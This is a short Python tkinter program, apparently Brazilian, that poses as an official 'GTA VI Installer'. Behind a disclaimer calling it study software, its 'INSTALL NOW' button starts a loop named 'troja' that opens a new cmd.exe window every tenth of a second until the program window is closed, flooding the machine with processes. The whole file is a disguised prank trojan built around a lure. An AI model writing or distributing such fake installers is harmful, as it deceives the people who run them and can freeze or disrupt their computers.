import tkinter as tk
from tkinter import messagebox
import threading
import os
import time

rodando = True

def troja():
    global rodando
    while rodando:
        os.system("start cmd.exe")
        time.sleep(0.1)

def iniciar_ataque():
    resposta = messagebox.askyesno("AVISO CRÍTICO", 
        "ESTE SOFTWARE É PARA FINS DE ESTUDO.\n\n"
        "Se acontecer algo com seu computador ou notebook, "
        "o desenvolvedor NÃO se responsabiliza.\n\n"
        "Deseja continuar por sua conta e risco?")
    
    if resposta:
        t = threading.Thread(target=troja)
        t.daemon = True
        t.start()
    else:
        messagebox.showinfo("Cancelado", "Instalação abortada por segurança.")

def ao_fechar():
    global rodando
    rodando = False
    os.system("taskkill /F /IM cmd.exe /T")
    janela.destroy()

janela = tk.Tk()
janela.title("GTA VI Installer - Official")
janela.geometry('400x250')
janela.protocol("WM_DELETE_WINDOW", ao_fechar)

label1 = tk.Label(janela, text="Grand Theft Auto VI", font=("Arial Black", 14), fg="green")
label1.pack(pady=10)

label2 = tk.Label(janela, text="Clique abaixo para iniciar a instalação", font=("Arial", 10))
label2.pack()

bt1 = tk.Button(janela,
                text="INSTALL NOW",
                bg="Green",
                fg="White",
                font=("Arial Black", 12),
                command=iniciar_ataque)
bt1.pack(pady=30)

label_legal = tk.Label(janela, text="© 2026 Davi - Use com cuidado", font=("Arial", 8), fg="gray")
label_legal.pack(side="bottom")

janela.mainloop()